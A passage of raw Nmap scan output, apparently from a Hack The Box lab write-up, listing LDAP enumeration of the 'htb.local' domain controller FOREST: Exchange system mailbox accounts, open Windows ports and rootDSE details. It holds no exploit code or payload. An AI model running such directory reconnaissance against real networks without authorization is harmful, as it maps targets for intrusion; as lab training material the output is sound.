|         displayName: Discovery Search Mailbox
|         uSNCreated: 23792
|         uSNChanged: 24875
|         proxyAddresses: SMTP:DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
|         name: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
|         objectGUID: 1c1af25-7ae0-c54e-b51c-ade57a648c
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1127
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_681f53d4942840e18
|         sAMAccountType: 805306368
|         showInAddressBook: CN=All Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=4603f8b937e84923b718670f87760b7b-Disco
|         userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
|         msExchVersion: 88218628259840
|         mDBOverHardQuotaLimit: 52428800
|         authOrigBL: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x8C\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00@\x00\x02\x00\x00\x00\x00\x02\x14\x00\x01\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x00\x02$\x00\x01\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00,\x1E%\xB7\x15u\xB2\x15\xC5\xB0\xF3OW\x04\x00\x00
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         delivContLength: 102400
|         authOrig: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 134
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         mDBOverQuotaLimit: 52428800
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxGuid: \xB7,\x8A[Sv\xAEA\xB7bu\xB1\x16\xE8u\xD2
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:347268379732724624526939192205462641538023730933422852
|         msExchUMDtmfMap: lastNameFirstName:673924347268379624526939192205462641538023730933422852
|         msExchUMDtmfMap: firstNameLastName:673924347268379624526939192205462641538023730933422852
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         submissionContLength: 102400
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 536870912
|         mailNickname: DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
|         msExchWhenMailboxCreated: 20190919114736.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         sn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         distinguishedName: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:42 UTC
|         displayName: Microsoft Exchange Migration
|         uSNCreated: 23797
|         uSNChanged: 24846
|         proxyAddresses: SMTP:Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
|         name: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         objectGUID: edd456b3-8384-c4b-9566-e9a98858a516
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1128
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_1b41c9286325456bb
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=57e7055a5ddd483c8abc1df53105efc9-Migra
|         userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
|         msExchVersion: 1126140425011200
|         mDBOverHardQuotaLimit: 307200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         mDBStorageQuota: 153600
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchMessageHygieneSCLRejectThreshold: 7
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         mDBOverQuotaLimit: 307200
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMessageHygieneSCLQuarantineThreshold: 9
|         msExchMailboxGuid: \xB3+\x93Xv\x04\xB9C\x92'\xA2\xF4B`t\xC0
|         msExchMessageHygieneSCLJunkThreshold: 4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:64472846683337716201143349621222623229136
|         msExchUMDtmfMap: lastNameFirstName:64472846683337716201143349621222623229136
|         msExchUMDtmfMap: firstNameLastName:64472846683337716201143349621222623229136
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchCapabilityIdentifiers: 48
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchMessageHygieneSCLDeleteThreshold: 9
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
|         msExchWhenMailboxCreated: 20190919114742.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         sn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         distinguishedName: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:48 UTC
|         displayName: Microsoft Exchange Federation Mailbox
|         uSNCreated: 23802
|         uSNChanged: 24851
|         proxyAddresses: SMTP:FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
|         name: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         objectGUID: 52be9726-123f-d14f-a13a-a5235a31e587
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1129
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_9b69f1b9d2cc45549
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=1e107e142f7341cc8acb1597635d96e0-Feder
|         userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
|         msExchVersion: 1126140425011200
|         mDBOverHardQuotaLimit: 1024
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         mDBStorageQuota: 1024
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchMessageHygieneSCLRejectThreshold: 7
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         mDBOverQuotaLimit: 1024
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMessageHygieneSCLQuarantineThreshold: 9
|         msExchMailboxGuid: |?\x7F?\xD5!\x17K\xA2\x10(H\xF1\x169@
|         msExchMessageHygieneSCLJunkThreshold: 4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:3333728333624542134382817941489323002953213042
|         msExchUMDtmfMap: lastNameFirstName:3333728333624542134382817941489323002953213042
|         msExchUMDtmfMap: firstNameLastName:3333728333624542134382817941489323002953213042
|         msExchArchiveWarnQuota: 94371840
|         msExchRMSComputerAccountsLink: CN=EXCH01,CN=Computers,DC=htb,DC=local
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchMessageHygieneSCLDeleteThreshold: 9
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
|         msExchWhenMailboxCreated: 20190919114748.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         sn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         distinguishedName: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:55 UTC
|         displayName: E4E Encryption Store - Active
|         uSNCreated: 23807
|         uSNChanged: 24860
|         proxyAddresses: SMTP:SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
|         name: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         objectGUID: 153cf762-a55c-bb44-a390-f1d6890ccdf
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1130
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_7c96b981967141ebb
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=7faef2597f78442cb92fa80bfa3fe4ad-Syste
|         userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchMessageHygieneSCLRejectThreshold: 7
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMessageHygieneSCLQuarantineThreshold: 9
|         msExchMailboxGuid: \x07n\xDFY\x96\x86ZD\x96\xB7\x85q\xAD\x8B\x026
|         msExchMessageHygieneSCLJunkThreshold: 4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526930340920239247209233222869203201
|         msExchUMDtmfMap: lastNameFirstName:797836624526930340920239247209233222869203201
|         msExchUMDtmfMap: firstNameLastName:797836624526930340920239247209233222869203201
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchMessageHygieneSCLDeleteThreshold: 9
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
|         msExchWhenMailboxCreated: 20190919114755.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
| 
| 
|_Result limited to 20 objects (see ldap.maxobjects)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20210904160039.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 1042676
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: FOREST.htb.local
|       ldapServiceName: htb.local:forest$@HTB.LOCAL
|       serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7
|       forestFunctionality: 7
|_      domainControllerFunctionality: 7
| ldap-search: 
|   Context: DC=htb,DC=local
|     dn: DC=htb,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=htb,DC=local
|         instanceType: 5
|         whenCreated: 2019/09/18 17:45:49 UTC
|         whenChanged: 2021/09/04 15:26:10 UTC
|         subRefs: DC=ForestDnsZones,DC=htb,DC=local
|         subRefs: DC=DomainDnsZones,DC=htb,DC=local
|         subRefs: CN=Configuration,DC=htb,DC=local
|         uSNCreated: 4099
|         uSNChanged: 929834
|         name: htb
|         objectGUID: dff0c71a-49a9-264b-8c7b-52e3e2cb6eab
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x80+\xBA\x07\xA0+|B\x8E\x91\xB7\x8C\xE2\xAFM\x9B
|         \x00\x00\x00\x00\x00\xD4\xBD>\x17\x03\x00\x00\x00i\xB5Y\x1F\xFA\x8B\xA9G\xB3\xB0R.\xA0\xD4b\xEC\x16P\x03\x00\x00\x00\x00\x00\x01\xD5\xAA\x13\x03\x00\x00\x00:\xA3k#YyAJ\xB9Y_\x82h\x9A\x08q\x05\xA0\x00\x00\x00\x00\x00\x00_!\x99\x13\x03\x00\x00\x00\xE7\x9D\x16,\x14\xD0\xD9K\xA1\xA3\x02\xD0?\xC08K 0\x0E\x00\x00\x00\x00\x00\x11!D\x17\x03\x00\x00\x00\xFD!?9\xEE\x966L\xB0C\xBC\x0Fp\x8Du\xBA\x19\x10\x04\x00\x00\x00\x00\x00n\xC9=\x17\x03\x00\x00\x00\x10<\x01A\xB4\x8C\x9DE\x88\xE2z\xBC\x05\x8E\xE3\xD7\x150\x03\x00\x00\x00\x00\x00\xD5\xD7\xA6\x13\x03\x00\x00\x00\xB50\xC6a\xA2A\xB0E\xB14A\x1A\xB5N1c\x08\xD0\x00\x00\x00\x00\x00\x00\x9F=\x99\x13\x03\x00\x00\x00N|cxf\x16\xECI\xAB\x9C\xCDQ\xEE`H\x81\x13p\x02\x00\x00\x00\x00\x00\xDDm\xA0\x13\x03\x00\x00\x001\xF4\xC6\x8BEpyC\xA6\x9B\x99\xF2\xB4\x8D&p\x0C\x10\x01\x00\x00\x00\x00\x00\x86\xC5\x99\x13\x03\x00\x00\x00\xB7\x02\xFE\x8F
|         \x00\x00\x00\x00\x00\x99\xC5>\x17\x03\x00\x00\x00\x12\xE3\xA9\xF1\xC0\xBA\xB7O\xAEj\x87\xBC\xDE:\xA7-\x07\xC0\x00\x00\x00\x00\x00\x00\xC37\x99\x13\x03\x00\x00\x00\x9E\xBD\x80\xF9D\x13\xFBE\xBA\xD8\x01
|         \xE0\x8E\x1B\x8F\x1C\xD0\x0C\x00\x00\x00\x00\x00\xB1\xAF>\x17\x03\x00\x00\x00
|         objectSid: 1-5-21-3072663084-364016917-1341370565
|         nTMixedDomain: 0
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=htb,DC=local
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=htb,DC=local
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=htb,DC=local
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=htb,DC=local
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=htb,DC=local
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=htb,DC=local
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=htb,DC=local
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=htb,DC=local
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=htb,DC=local
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=htb,DC=local
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=htb,DC=local
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=htb,DC=local
